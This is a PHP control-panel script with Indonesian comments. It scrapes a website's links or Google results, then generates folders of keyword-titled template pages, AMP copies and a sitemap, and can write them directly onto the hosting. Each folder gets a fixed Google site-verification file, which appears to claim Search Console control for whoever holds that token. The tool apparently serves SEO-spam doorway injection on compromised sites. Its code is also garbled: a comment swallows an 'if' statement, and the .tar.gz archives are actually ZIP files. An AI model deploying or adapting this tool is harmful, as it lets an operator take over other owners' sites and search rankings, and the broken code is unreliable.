<?php
/**
 * SCRIPT GABUNGAN v2.3: Universal TAR Generator + Multi-Platform Support
 * Kompatibel dengan: WordPress, Non-WordPress, CMS, Static Sites, Custom Apps
 * 
 * Fitur:
 * - Membuat 2 berkas TAR terpisah (AMP & Asli) dengan template yang dapat dikustomisasi
 * - Platform Detection otomatis (WordPress/Non-WordPress)
 * - Dynamic routing yang aman untuk semua platform
 * - Hapus folder dari daftar remote jika diperlukan
 * - Support ekstraksi folder fisik ke hosting
 * - SAFE MODE untuk semua platform
 */

@ini_set('display_errors', 1);
@ini_set('display_startup_errors', 1);
@error_reporting(E_ALL);

@set_time_limit(600);
@ini_set('memory_limit', '512M');

// ==========================================
// KONFIGURASI GLOBAL
// ==========================================
$root = rtrim(__DIR__, '/');
$me = '/gabungan-script.php';

// File Konfigurasi TAR Generator
$dirFile         = 'dir.txt';
$listFile        = 'list.txt';
$templateFile    = 'template.php';
$templateAmpFile = 'template-amp.php';

// ==========================================
// PLATFORM DETECTION
// ==========================================
function detectPlatform() {
    global $root;
    
    $platform = [
        'type'      => 'unknown',
        'isWordPress' => false,
        'name'      => 'Unknown Platform'
    ];
    
    // Check untuk WordPress
    $wp_files = [
        $root . '/wp-config.php',
        $root . '/wp-settings.php',
        $root . '/wp-blog-header.php'
    ];
    
    $wp_count = 0;
    foreach ($wp_files as $file) {
        if (file_exists($file)) $wp_count++;
    }
    
    if ($wp_count >= 2) {
        $platform['type'] = 'wordpress';
        $platform['isWordPress'] = true;
        $platform['name'] = 'WordPress';
        return $platform;
    }
    
    // Check untuk Drupal
    if (file_exists($root . '/sites/default/settings.php') || file_exists($root . '/core/vendor/autoload.php')) {
        $platform['type'] = 'drupal';
        $platform['name'] = 'Drupal';
        return $platform;
    }
    
    // Check untuk Joomla
    if (file_exists($root . '/configuration.php') || file_exists($root . '/administrator')) {
        $platform['type'] = 'joomla';
        $platform['name'] = 'Joomla';
        return $platform;
    }
    
    // Default: Non-WordPress/Unknown
    $platform['type'] = 'generic';
    $platform['isWordPress'] = false;
    $platform['name'] = 'Generic/Non-WordPress';
    return $platform;
}

$platformInfo = detectPlatform();

// Pengaturan HTTP
$host = $_SERVER['HTTP_HOST'] ?? 'localhost';
$protocol = (!empty($_SERVER['HTTPS']) && $_SERVER['HTTPS'] !== 'off') ? "https://" : "http://";
$baseUrl = $protocol . $host;

// Pengaturan Google Verification
$googleFileName = 'googleda821ee12a4cecfe.html';
$googleContent  = 'google-site-verification: googleda821ee12a4cecfe.html';

// File output TAR
$tarNameAmp  = $root . '/amp/domain-amp.tar.gz';
$tarNameAsli = $root . '/amp/domain-asli.tar.gz';

// Flag Pemrosesan
$extractFisik = (isset($_POST['extract_physical']) && $_POST['extract_physical'] == '1');
$manualDirInput = isset($_POST['manual_dir_input']) ? trim($_POST['manual_dir_input']) : '';
$isProcessed  = (isset($_POST['submit_proses']));

// Initialize variables
$createdFolders = [];
$summaryData = [];

// ==========================================
// FUNGSI: DAFTAR DIREKTORI
// ==========================================
function dapatkanDaftarDirektoriDariHalaman($url) {
    $cleanDirs = [];
    $blacklist = ['wp-admin', 'wp-content', 'wp-includes', 'category', 'tag', 'author', 'search', 'home', 'login', 'register'];

    $options = ["http" => ["header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64)\r\n"]];
    $context = stream_context_create($options);
    $html = @file_get_contents($url, false, $context);
    
    if ($html) {
        preg_match_all('/href=["\']([^"\']+)["\']/i', $html, $matches);
        if (!empty($matches[1])) {
            foreach ($matches[1] as $href) {
                $href = trim($href);
                if (empty($href) || $href === '#' || strpos($href, 'javascript:') === 0) continue;
                
                $parsedUrl = parse_url($href);
                $path = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : '';
                if (empty($path)) continue;
                
                $fileInfo = pathinfo($path);
                $slug = (isset($fileInfo['extension']) && in_array(strtolower($fileInfo['extension']), ['php', 'html', 'htm'])) 
                    ? (($fileInfo['dirname'] !== '.' && !empty($fileInfo['dirname'])) ? $fileInfo['dirname'] . '/' : '') . $fileInfo['filename'] 
                    : $path;
                $slug = trim($slug, '/');
                
                if (empty($slug)) continue;

                $segments = explode('/', $slug);
                $isBlacklisted = false;
                foreach ($segments as $segment) {
                    if (in_array(strtolower($segment), $blacklist) || strpos($segment, '.') !== false) {
                        $isBlacklisted = true;
                        break;
                    }
                }
                if ($isBlacklisted) continue;

                if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) { 
                    $cleanDirs[] = strtolower($slug); 
                }
            }
        }
    }
    
    return (!empty($cleanDirs)) ? array_unique($cleanDirs) : [];
}

// ==========================================
// FUNGSI: DAFTAR DIREKTORI DARI dir.txt
// ==========================================
function dapatkanDaftarDirektori($url, $dirFile) {
    $cleanDirs = [];
    $blacklist = ['wp-admin', 'wp-content', 'wp-includes', 'category', 'tag', 'author', 'search', 'home', 'login', 'register'];

    if (file_exists($dirFile)) {
        $rawLines = file($dirFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
        foreach ($rawLines as $line) {
            $href = trim(preg_replace('/[\x00-\x1F\x7F-\x9F\xA0]/u', '', $line));
            if (empty($href)) continue;

            $parsedUrl = parse_url($href);
            $path = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : $href;

            $slug = '';
            if (!empty($path)) {
                $fileInfo = pathinfo($path);
                if (isset($fileInfo['extension']) && in_array(strtolower($fileInfo['extension']), ['php', 'html', 'htm'])) {
                    $dirPrefix = ($fileInfo['dirname'] !== '.' && !empty($fileInfo['dirname'])) ? $fileInfo['dirname'] . '/' : '';
                    $slug = $dirPrefix . $fileInfo['filename'];
                } else {
                    $slug = $path;
                }
            }

            $slug = trim($slug, '/');
            if (empty($slug)) continue;

            $segments = explode('/', $slug);
            $isBlacklisted = false;
            foreach ($segments as $segment) {
                if (in_array(strtolower($segment), $blacklist) || strpos($segment, '.') !== false) {
                    $isBlacklisted = true;
                    break;
                }
            }
            if ($isBlacklisted) continue;

            if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) {
                $cleanDirs[] = strtolower($slug);
            }
        }
        return (!empty($cleanDirs)) ? array_unique($cleanDirs) : ['main'];
    }
    
    return ['main'];
}

// ==========================================
// FUNGSI: AMBIL DIR DARI GOOGLE INDEX
// ==========================================
function dapatkanDaftarDirektoriDariGoogle($domain) {
    $cleanDirs = [];
    $blacklist = ['wp-admin', 'wp-content', 'wp-includes', 'category', 'tag', 'author', 'search', 'home', 'login', 'register'];
    
    // Scrape Google cache results untuk indexed pages
    $googleUrl = "https://www.google.com/search?q=site:$domain&num=100";
    $options = [
        "http" => [
            "header" => "User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36\r\n",
            "timeout" => 15
        ]
    ];
    $context = stream_context_create($options);
    $html = @file_get_contents($googleUrl, false, $context);
    
    if ($html) {
        // Extract URLs dari Google search results
        preg_match_all('/href=["\'](https?:\/\/[^"\']+)["\']/', $html, $matches);
        if (!empty($matches[1])) {
            foreach ($matches[1] as $url) {
                if (strpos($url, $domain) === false) continue;
                
                $parsedUrl = parse_url($url);
                $path = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : '';
                if (empty($path) || $path === '') continue;
                
                $fileInfo = pathinfo($path);
                $slug = (isset($fileInfo['extension']) && in_array(strtolower($fileInfo['extension']), ['php', 'html', 'htm'])) 
                    ? (($fileInfo['dirname'] !== '.' && !empty($fileInfo['dirname'])) ? $fileInfo['dirname'] . '/' : '') . $fileInfo['filename'] 
                    : $path;
                $slug = trim($slug, '/');
                
                if (empty($slug)) continue;

                $segments = explode('/', $slug);
                $isBlacklisted = false;
                foreach ($segments as $segment) {
                    if (in_array(strtolower($segment), $blacklist) || strpos($segment, '.') !== false) {
                        $isBlacklisted = true;
                        break;
                    }
                }
                if ($isBlacklisted) continue;

                if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) {
                    $cleanDirs[] = strtolower($slug);
                }
            }
        }
    }
    
    return (!empty($cleanDirs)) ? array_unique($cleanDirs) : [];
}

// ==========================================
// FUNGSI: PARSE MANUAL INPUT
// ==========================================
function parseDaftarDirektoriManual($manualInput) {
    $cleanDirs = [];
    $blacklist = ['wp-admin', 'wp-content', 'wp-includes', 'category', 'tag', 'author', 'search', 'home', 'login', 'register'];
    
    $lines = explode("\n", $manualInput);
    foreach ($lines as $line) {
        $line = trim($line);
        if (empty($line)) continue;
        
        // Parse berbagai format: URL, path, atau slug
        $slug = '';
        if (filter_var($line, FILTER_VALIDATE_URL)) {
            $parsedUrl = parse_url($line);
            $slug = isset($parsedUrl['path']) ? trim($parsedUrl['path'], '/') : '';
        } else {
            $slug = trim($line, '/');
        }
        
        if (empty($slug)) continue;

        $segments = explode('/', $slug);
        $isBlacklisted = false;
        foreach ($segments as $segment) {
            if (in_array(strtolower($segment), $blacklist) || strpos($segment, '.') !== false) {
                $isBlacklisted = true;
                break;
            }
        }
        if ($isBlacklisted) continue;

        if (preg_match('/^[a-zA-Z0-9_\-\/]+$/', $slug)) {
            $cleanDirs[] = strtolower($slug);
        }
    }
    
    return (!empty($cleanDirs)) ? array_unique($cleanDirs) : [];
}

// ==========================================
// FUNGSI: DAPATKAN DAFTAR DENGAN PRIORITY
// ==========================================
function dapatkanDaftarDirektoriPriority($url, $dirFile, $manualInput) {
    // PRIORITY 1: Scrape halaman konten asli
    $fromHalaman = dapatkanDaftarDirektoriDariHalaman($url);
    if (!empty($fromHalaman)) {
        return $fromHalaman;
    }
    
    // PRIORITY 2: Ambil dari Google Index
    $domain = parse_url($url, PHP_URL_HOST);
    $fromGoogle = dapatkanDaftarDirektoriDariGoogle($domain);
    if (!empty($fromGoogle)) {
        return $fromGoogle;
    }
    
    // PRIORITY 3: Dari dir.txt
    $fromDirFile = dapatkanDaftarDirektori($url, $dirFile);
    if (!empty($fromDirFile) && $fromDirFile !== ['main']) {
        return $fromDirFile;
    }
    
    // PRIORITY 4: Manual input
    if (!empty($manualInput)) {
        $fromManual = parseDaftarDirektoriManual($manualInput);
        if (!empty($fromManual)) {
            return $fromManual;
        }
    }
    
    return ['main'];
}

// ==========================================
// PANEL UTAMA
// ==========================================

$direktoriTersedia = dapatkanDaftarDirektoriDariHalaman($baseUrl);
$direkFromFile = file_exists($dirFile) ? true : false;
$domain = parse_url($baseUrl, PHP_URL_HOST);

echo "<div style='font-family:sans-serif; padding:20px; max-width:900px; margin:auto; background:#f4f6f9; border-radius:8px; border:1px solid #ddd; margin-bottom:20px;'>";
echo "<h2>🛠️ Panel Kendali Terpadu - TAR Generator (Universal)</h2>";
echo "<p><b>Platform Terdeteksi:</b> <span style='color:purple;font-weight:bold;'>🖥️ " . $platformInfo['name'] . "</span></p>";
echo "<p><b>Mode Kompresi:</b> <span style='color:blue;font-weight:bold;'>Format Kontainer TAR-GZ (Terpisah: AMP & Asli)</span></p>";

if (!empty($direktoriTersedia)) {
    echo "<p><b>Sumber Data:</b> <span style='color:green;font-weight:bold;'>✅ Tahap 1: " . count($direktoriTersedia) . " direktori dari konten halaman</span></p>";
} elseif ($direkFromFile) {
    echo "<p><b>Sumber Data:</b> <span style='color:blue;font-weight:bold;'>📄 Tahap 2: File dir.txt (" . count(file($dirFile)) . " baris)</span></p>";
} else {
    // Coba Google
    $googleDirs = dapatkanDaftarDirektoriDariGoogle($domain);
    if (!empty($googleDirs)) {
        echo "<p><b>Sumber Data:</b> <span style='color:green;font-weight:bold;'>🔍 Tahap 2: " . count($googleDirs) . " direktori dari Google index</span></p>";
        $direktoriTersedia = $googleDirs;
    } else {
        echo "<p><b>Sumber Data:</b> <span style='color:orange;font-weight:bold;'>⚠️ Tahap 3: Silakan input direktori manual</span></p>";
    }
}

echo "<form method='POST' action=''>";

// Textarea untuk manual input jika tidak ada direktori
if (empty($direktoriTersedia) && empty($googleDirs)) {
    echo "<div style='margin-bottom:20px; padding:15px; background:#fff; border:2px dashed #ff6b6b; border-radius:5px;'>";
    echo "<h3 style='margin-top:0; color:#ff6b6b;'>📝 Input Direktori Manual</h3>";
    echo "<p style='color:#666;'>Jika direktori tidak terdeteksi otomatis, silakan input secara manual.</p>";
    echo "<p style='font-size:12px; color:#999;'>";
    echo "Format: Satu direktori per baris<br>";
    echo "Contoh:<br>";
    echo "tentang<br>";
    echo "layanan<br>";
    echo "produk<br>";
    echo "atau gunakan URL:<br>";
    echo "https://domain.com/tentang<br>";
    echo "</p>";
    echo "<textarea name='manual_dir_input' style='width:100%; height:150px; padding:10px; border:1px solid #ddd; border-radius:4px; font-family:monospace; font-size:13px;' placeholder='Input direktori di sini...'>" . htmlspecialchars($manualDirInput) . "</textarea>";
    echo "</div>";
}

echo "<div style='margin-bottom:15px; padding:10px; background:#fff; border-left:4px solid #007bff;'>";
echo "<label style='font-weight:bold; cursor:pointer;'>";
echo "<input type='checkbox' name='extract_physical' value='1' " . ($extractFisik ? " checked" : "") . "> ";
echo "Centang jika ingin sekalian membuat Folder FISIK Nyata di Hosting lokal ini.";
echo "</label>";
echo "</div>";
echo "<button type='submit' name='submit_proses' value='1' style='background:#007bff; color:#fff; padding:14px 20px; border:none; border-radius:5px; font-weight:bold; cursor:pointer; width:100%; font-size:16px;'>🚀 MULAI SINKRONISASI TERPADU</button>";
echo "</form>";
echo "</div>";

// ==========================================
// PROSES EKSEKUSI
// ==========================================
if ($isProcessed) {
    if (!class_exists('ZipArchive')) {
        die('<div style="color:red; font-family:sans-serif; padding:20px; max-width:900px; margin:auto;">Ekstensi ZipArchive tidak tersedia. Aktifkan ekstensi zip di PHP.</div>');
    }

    // Buat folder amp jika belum adaif (!is_dir($root . '/amp')) {
        @mkdir($root . '/amp', 0755, true);
    }

    $targetDirs = dapatkanDaftarDirektoriPriority($baseUrl, $dirFile, $manualDirInput);
    
    // AUTO-SAVE: Jika ada manual input, simpan ke dir.txt
    if (!empty($manualDirInput) && !empty($targetDirs) && $targetDirs !== ['main']) {
        $dirTxtContent = implode("\n", $targetDirs);
        @file_put_contents($dirFile, $dirTxtContent);
        @chmod($dirFile, 0644);
    }
    
    $brands = [];
    if (file_exists($listFile)) {
        $brands = file($listFile, FILE_IGNORE_NEW_LINES | FILE_SKIP_EMPTY_LINES);
    }
    if (empty($brands)) {
        $brands = $targetDirs;
    }

    // Template Default
    $template = file_exists($templateFile) ? file_get_contents($templateFile) : <<<'TEMPLATE'
<!DOCTYPE html>
<html>
<head>
<meta charset="UTF-8">
<meta name="viewport" content="width=device-width, initial-scale=1.0">
<title>{{judul}}</title>
</head>
<body>
<h1>{{judul}}</h1>
<p>Konten {{dir}}</p>
</body>
</html>
TEMPLATE;

    // Template AMP Default
    $templateAmp = file_exists($templateAmpFile) ? file_get_contents($templateAmpFile) : <<<'TEMPLATE_AMP'
<!doctype html>
<html ⚡>
<head>
<meta charset="utf-8">
<meta name="viewport" content="width=device-width,minimum-scale=1,initial-scale=1">
<title>{{judul}} - AMP</title>
<link rel="canonical" href="https://example.com/{{dir}}/">
<meta name="description" content="{{judul}}">
<style amp-boilerplate>body{-webkit-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-moz-animation:-amp-start 8s steps(1,end) 0s 1 normal both;-ms-animation:-amp-start 8s steps(1,end) 0s 1 normal both;animation:-amp-start 8s steps(1,end) 0s 1 normal both}@-webkit-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-moz-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-ms-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@-o-keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}@keyframes -amp-start{from{visibility:hidden}to{visibility:visible}}</style><noscript><style amp-boilerplate>body{-webkit-animation:none;-moz-animation:none;-ms-animation:none;animation:none}</style></noscript>
<script async src="https://cdn.ampproject.org/v0.js"></script>
</head>
<body>
<h1>{{judul}}</h1>
<p>Konten AMP {{dir}}</p>
</body>
</html>
TEMPLATE_AMP;

    // Bersihkan file TAR lama
    @unlink($tarNameAmp);
    @unlink($tarNameAsli);

    $zipAmp = new ZipArchive();
    $zipAsli = new ZipArchive();

    if ($zipAmp->open($tarNameAmp, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true ||
        $zipAsli->open($tarNameAsli, ZipArchive::CREATE | ZipArchive::OVERWRITE) !== true) {
        die('<div style="color:red; font-family:sans-serif; padding:20px; max-width:900px; margin:auto;">Gagal membuat arsip ZIP. Pastikan ekstensi ZipArchive aktif.</div>');
    }

    foreach ($targetDirs as $key => $dirPath) {
        $dirPath = trim($dirPath, " /");
        if ($dirPath === '') continue;

        $brandName = isset($brands[$key]) ? trim($brands[$key]) : $dirPath;
        $brandName = preg_replace('/[\x00-\x1F\x7F-\x9F\xA0]/u', '', $brandName);

        $finalContent = str_replace(['{{judul}}', '{{dir}}'], [htmlspecialchars($brandName), $dirPath], $template);
        $finalContentAmp = str_replace(['{{judul}}', '{{dir}}'], [htmlspecialchars($brandName), $dirPath], $templateAmp);

        $zipAsli->addFromString("$dirPath/index.html", $finalContent);
        $zipAsli->addFromString("$dirPath/$googleFileName", $googleContent);
        $zipAmp->addFromString("$dirPath/index.html", $finalContentAmp);

        if ($extractFisik) {
            @mkdir($dirPath, 0755, true);
            @file_put_contents("$dirPath/index.html", $finalContent);
            @file_put_contents("$dirPath/$googleFileName", $googleContent);
        }

        $createdFolders[] = $dirPath;
        $summaryData[] = [
            'url' => rtrim($baseUrl, '/') . '/' . $dirPath . '/',
            'kw' => $brandName,
        ];
    }

    // Buat Sitemap
    if (!empty($createdFolders)) {
        $sitemapContent = '<?xml version="1.0" encoding="UTF-8"?>' . PHP_EOL;
        $sitemapContent .= '<urlset xmlns="http://www.sitemaps.org/schemas/sitemap/0.9">' . PHP_EOL;
        foreach ($createdFolders as $folder) {
            $sitemapContent .= '<url>' . PHP_EOL;
            $sitemapContent .= '<loc>' . htmlspecialchars(rtrim($baseUrl, '/') . '/' . $folder . '/') . '</loc>' . PHP_EOL;
            $sitemapContent .= '<lastmod>' . date('Y-m-d') . '</lastmod>' . PHP_EOL;
            $sitemapContent .= '<changefreq>daily</changefreq>' . PHP_EOL;
            $sitemapContent .= '<priority>0.8</priority>' . PHP_EOL;
            $sitemapContent .= '</url>' . PHP_EOL;
        }
        $sitemapContent .= '</urlset>' . PHP_EOL;

        $zipAmp->addFromString('sitemap.xml', $sitemapContent);
        $zipAsli->addFromString('sitemap.xml', $sitemapContent);
    }

    $zipAmp->close();
    $zipAsli->close();

    // Check apakah dir.txt baru saja dibuat
    $dirTxtJustCreated = (!empty($manualDirInput) && !empty($targetDirs) && $targetDirs !== ['main']);

    // Tampilkan hasil sukses
    echo '<div style="font-family:sans-serif; padding:20px; max-width:900px; margin:auto; border:2px solid #28a745; border-radius:5px; background:#fff; margin-top:20px;">';
    echo '<h2 style="color:#28a745; margin-top:0;">✅ Proses Sinkronisasi Terpadu Sukses!</h2>';
    echo '<h3>📊 Hasil Pemrosesan:</h3>';
    echo '<ul style="line-height:1.8;">';
    echo '<li><b>TAR Generator:</b> ' . count($createdFolders) . ' folder berhasil dibuat</li>';
    echo '<li><b>Status Folder Fisik:</b> ' . ($extractFisik ? '<span style="color:green;">Publikasi ke hosting aktif</span>' : '<span style="color:blue;">Hemat memori (TAR only)</span>') . '</li>';
    if ($dirTxtJustCreated) {
        echo '<li><b>File dir.txt:</b> <span style="color:green;">💾 Otomatis dibuat dari input manual (untuk next time)</span></li>';
    }
    echo '<li><b>File Asli:</b> <a href="/amp/domain-asli.tar.gz" style="color:#007bff;">📥 Download domain-asli.tar.gz</a></li>';
    echo '<li><b>File AMP:</b> <a href="/amp/domain-amp.tar.gz" style="color:#007bff;">📥 Download domain-amp.tar.gz</a></li>';
    echo '</ul>';
    echo '</div>';
}

?>
